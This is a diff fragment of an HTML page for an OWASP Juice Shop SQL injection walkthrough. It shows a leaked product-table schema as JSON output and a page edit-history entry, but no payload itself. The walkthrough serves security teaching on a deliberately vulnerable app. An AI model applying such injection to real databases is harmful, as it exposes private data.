+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="dv">2</span><span class="fu">,</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;description&quot;</span><span class="fu">:</span> <span class="dv">3</span><span class="fu">,</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;price&quot;</span><span class="fu">:</span> <span class="dv">4</span><span class="fu">,</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;deluxePrice&quot;</span><span class="fu">:</span> <span class="dv">5</span><span class="fu">,</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;image&quot;</span><span class="fu">:</span> <span class="dv">6</span><span class="fu">,</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;createdAt&quot;</span><span class="fu">:</span> <span class="dv">7</span><span class="fu">,</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;updatedAt&quot;</span><span class="fu">:</span> <span class="dv">8</span><span class="fu">,</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;deletedAt&quot;</span><span class="fu">:</span> <span class="dv">9</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
 <p>That’s our schema for <em>this</em> database, leaked via SQL injection.</p>
 <p>We can see more data from the <code>sql</code> table at the end of the response:</p>
 <figure>
@@ -419,6 +443,18 @@ View full code
     <details>
       <summary>See edit history for "OWASP Juice Shop Injection Walkthrough"</summary>
       <dl class="edits">
+        
+          <div class="edit">
+            <dt>
+              Zack Sargent edited this page on 
+              <time datetime="2023-10-13T11:52:46-04:00">
+                Friday, October 13, 2023 at 11:52 AM
+              </time>
+            </dt>
+            <dd>
+              1 file changed, 34 insertions(+), 5 deletions(-)
+            </dd>
+          </div>
         
           <div class="edit">
             <dt>
